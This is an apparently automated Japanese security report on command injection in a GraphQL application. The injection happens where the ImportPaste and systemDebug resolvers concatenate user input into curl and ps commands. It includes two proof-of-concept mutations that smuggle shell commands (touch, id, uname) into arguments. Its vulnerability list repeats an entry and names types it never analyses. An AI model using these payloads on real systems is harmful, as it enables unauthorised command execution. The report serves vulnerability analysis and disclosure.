# PAR Security Analysis Report

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `RCE`
- `SSRF`
- `AFO`
- `SSRF`
- `SQLI`
- `XSS`
- `IDOR`
- `LFI`

## PAR Policy Analysis

### Principals (データ源)


### Actions (セキュリティ制御)


### Resources (操作対象)


## 詳細解析

本アプリケーションでは、ユーザーがGraphQL経由で任意の文字列を送信し、それをそのままshellコマンドに連結して実行する箇所が複数存在します。具体的には、ImportPaste.mutateメソッド内で組み立てたURLをcurlコマンドとして実行する箇所と、resolve_system_debug内で未検証の引数をpsコマンドに渡す箇所です。いずれも入力値の適切なサニタイズやホワイトリストによる検証が行われておらず、メタ文字やセミコロンを用いたコマンドインジェクションが可能であるため、RCE（Remote Code Execution）の脆弱性が高確率で存在します。

## PoC（概念実証コード）

```text
# ImportPaste を悪用したPoC
mutation {
  importPaste(host:"example.com; touch /tmp/pwned; #", port:443, path:"/", scheme:"http") {
    result
  }
}

# resolve_system_debug を悪用したPoC
mutation {
  systemDebug(arg:";id; uname -a > /tmp/pwned;")
}
```

## 解析ノート

1. ImportPaste.mutateでf-stringを使いURLをcurlに連結  2. resolve_system_debugで未検証のargをpsコマンドに連結  3. いずれも入力バリデーション・ホワイトリストが不足  4. コマンドインジェクションにより任意コード実行可能

